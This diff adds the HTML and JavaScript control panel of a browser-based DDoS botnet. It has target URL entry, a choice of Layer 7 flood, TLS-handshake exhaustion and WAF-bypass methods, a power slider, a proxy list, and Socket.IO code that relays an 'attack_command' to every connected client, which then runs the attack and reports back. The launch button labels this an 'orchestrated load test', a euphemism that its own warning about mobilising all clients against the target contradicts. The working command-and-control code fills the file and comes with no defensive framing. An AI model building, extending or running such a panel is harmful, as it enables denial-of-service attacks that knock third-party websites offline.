@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+        }
+        #app {
+            display: grid;
+            grid-template-columns: 300px 1fr;
+            height: 100vh;
+        }
+        .sidebar {
+            background: #111;
+            border-right: 1px solid #00ff00;
+            padding: 1rem;
+            overflow-y: auto;
+        }
+        .main {
+            padding: 1rem;
+            overflow-y: auto;
+        }
+        .panel {
+            background: #151515;
+            border: 1px solid #333;
+            margin-bottom: 1rem;
+            padding: 1rem;
+        }
+        h2, h3 {
+            color: #00ff00;
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        input, textarea, select {
+            width: 100%;
+            background: #000;
+            border: 1px solid #333;
+            color: #00ff00;
+            padding: 0.5rem;
+            margin: 0.5rem 0;
+            font-family: monospace;
+        }
+        textarea {
+            height: 100px;
+            resize: vertical;
+        }
+        button {
+            background: #000;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 0.8rem 1.5rem;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin: 0.2rem;
+            transition: all 0.3s;
+        }
+        button:hover {
+            background: #00ff00;
+            color: #000;
+        }
+        button.danger {
+            border-color: #ff0000;
+            color: #ff0000;
+        }
+        button.danger:hover {
+            background: #ff0000;
+            color: #000;
+        }
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 0.5rem;
+        }
+        .online { background: #00ff00; box-shadow: 0 0 10px #00ff00; }
+        .offline { background: #ff0000; }
+        .log {
+            background: #000;
+            border: 1px solid #222;
+            padding: 0.5rem;
+            margin: 0.2rem 0;
+            font-size: 0.8rem;
+            color: #888;
+        }
+        .log.success { color: #00ff00; }
+        .log.error { color: #ff0000; }
+        .log.warning { color: #ffff00; }
+    </style>
+</head>
+<body>
+    <div id="app">
+        <div class="sidebar">
+            <div class="panel">
+                <h2>CONTROL PANEL</h2>
+                <p>Status: <span id="statusIndicator" class="status-indicator offline"></span> <span id="statusText">DISCONNECTED</span></p>
+                <p>Clients: <span id="clientCount">0</span></p>
+                <p>Session: <span id="sessionId">N/A</span></p>
+            </div>
+            
+            <div class="panel">
+                <h3>QUICK ACTIONS</h3>
+                <button onclick="testConnection()">Test Connection</button>
+                <button onclick="getStats()">Get Stats</button>
+                <button class="danger" onclick="clearLogs()">Clear Logs</button>
+                <button class="danger" onclick="disconnect()">Disconnect</button>
+            </div>
+            
+            <div class="panel">
+                <h3>ACTIVE ATTACKS</h3>
+                <div id="activeAttacks"></div>
+            </div>
+        </div>
+        
+        <div class="main">
+            <div class="panel">
+                <h2>DEPLOYMENT CONSOLE</h2>
+                
+                <div class="panel">
+                    <h3>TARGET CONFIGURATION</h3>
+                    <input type="url" id="targetUrl" placeholder="https://target-domain.com" value="">
+                    
+                    <h3>ATTACK METHOD</h3>
+                    <select id="attackMethod">
+                        <option value="rapid">RAPID-HTTP (Layer 7)</option>
+                        <option value="tls">TLS-HANDSHAKE (Resource Exhaustion)</option>
+                        <option value="waf">WAF-BYPASS (Rule Evasion)</option>
+                    </select>
+                    
+                    <h3>ATTACK POWER (1-100)</h3>
+                    <input type="range" id="attackPower" min="1" max="100" value="10">
+                    <span id="powerValue">10</span>
+                    
+                    <h3>DURATION (seconds)</h3>
+                    <input type="number" id="attackDuration" min="10" max="300" value="60">
+                </div>
+                
+                <div class="panel">
+                    <h3>PROXY CONFIGURATION (Premium)</h3>
+                    <textarea id="proxyList" placeholder="socks5://proxy1:port
+socks5://proxy2:port
+http://proxy3:port"></textarea>
+                    <p style="color:#888; font-size:0.8rem;">One proxy per line. SOCKS5 recommended.</p>
+                </div>
+                
+                <div class="panel">
+                    <button onclick="launchAttack()" style="background:#300;color:#f00;padding:1rem 2rem;font-size:1.2rem;">
+                        ⚡ DEPLOY ORCHESTRATED LOAD TEST ⚡
+                    </button>
+                    <p style="color:#f00; margin-top:1rem;">WARNING: This will mobilize all connected clients against the target.</p>
+                </div>
+            </div>
+            
+            <div class="panel">
+                <h2>SYSTEM LOG</h2>
+                <div id="logContainer"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Client-side attack scripts -->
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/methods/waf.js"></script>
+    <script src="/methods/rapid.js"></script>
+    <script src="/methods/tls.js"></script>
+    
+    <script>
+        // Get session from cookie
+        function getSessionId() {
+            const match = document.cookie.match(/session_id=([^;]+)/);
+            return match ? match[1] : null;
+        }
+        
+        const sessionId = getSessionId();
+        if (!sessionId) {
+            window.location.href = '/login.html';
+        }
+        
+        // Connect to Socket.IO
+        const socket = io({
+            auth: { sessionId },
+            transports: ['websocket']
+        });
+        
+        // DOM Elements
+        const statusIndicator = document.getElementById('statusIndicator');
+        const statusText = document.getElementById('statusText');
+        const clientCount = document.getElementById('clientCount');
+        const sessionIdEl = document.getElementById('sessionId');
+        const powerSlider = document.getElementById('attackPower');
+        const powerValue = document.getElementById('powerValue');
+        const logContainer = document.getElementById('logContainer');
+        
+        // Set session ID
+        sessionIdEl.textContent = sessionId.substring(0, 8) + '...';
+        
+        // Update power value display
+        powerSlider.addEventListener('input', () => {
+            powerValue.textContent = powerSlider.value;
+        });
+        
+        // Log function
+        function addLog(message, type = 'info') {
+            const log = document.createElement('div');
+            log.className = `log ${type}`;
+            log.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logContainer.appendChild(log);
+            logContainer.scrollTop = logContainer.scrollHeight;
+        }
+        
+        // Socket.IO Events
+        socket.on('connect', () => {
+            statusIndicator.className = 'status-indicator online';
+            statusText.textContent = 'CONNECTED';
+            addLog('Connected to orchestrator server', 'success');
+        });
+        
+        socket.on('welcome', (data) => {
+            clientCount.textContent = data.clients;
+            addLog(`Server welcome: ${data.message}`);
+        });
+        
+        socket.on('attack_command', (attackConfig) => {
+            addLog(`⚡ RECEIVED COMMAND: Attack ${attackConfig.id}`, 'warning');
+            addLog(`Target: ${attackConfig.target} | Method: ${attackConfig.method} | Power: ${attackConfig.power}`);
+            
+            // Execute the attack based on method
+            switch(attackConfig.method) {
+                case 'rapid':
+                    executeRapidAttack(attackConfig);
+                    break;
+                case 'tls':
+                    executeTLSAttack(attackConfig);
+                    break;
+                case 'waf':
+                    executeWAFAttack(attackConfig);
+                    break;
+            }
+            
+            // Report back
+            socket.emit('client_report', {
+                attackId: attackConfig.id,
+                status: 'executing',
+                timestamp: Date.now()
+            });
+        });
+        
+        socket.on('disconnect', () => {
+            statusIndicator.className = 'status-indicator offline';
+            statusText.textContent = 'DISCONNECTED';
+            addLog('Disconnected from server', 'error');
+        });
+        
+        // Attack functions
+        function launchAttack() {
+            const target = document.getElementById('targetUrl').value;
+            const method = document.getElementById('attackMethod').value;
+            const power = parseInt(document.getElementById('attackPower').value);
+            const duration = parseInt(document.getElementById('attackDuration').value);
+            const proxies = document.getElementById('proxyList').value;
+            
+            if (!target) {
+                addLog('Error: No target specified', 'error');
+                return;
+            }
+            
+            const attackConfig = {
+                target,
+                method,
+                power,
+                duration,
+                proxies
+            };
+            
+            socket.emit('launch_attack', attackConfig);
+            addLog(`Launched attack command: ${method.toUpperCase()} against ${target}`, 'warning');
+        }
+        
+        // UI Functions
+        function testConnection() {
+            addLog('Testing connection to orchestrator...', 'info');
+            socket.emit('ping', { timestamp: Date.now() });
+        }
+        
+        function getStats() {
+            fetch('/health')
+                .then(r => r.json())
+                .then(data => {
+                    addLog(`Stats: ${data.clients} clients, ${data.sessions} sessions`, 'info');
+                });
+        }
+        
+        function clearLogs() {
+            logContainer.innerHTML = '';
+            addLog('Logs cleared', 'info');
+        }
+        
+        function disconnect() {
+            socket.disconnect();
+            addLog('Manually disconnected', 'info');
+        }
+        
+        // Initialize
+        addLog('Dashboard initialized', 'success');
+        addLog('Awaiting commands...', 'info');
+    </script>
+</body>
+</html>
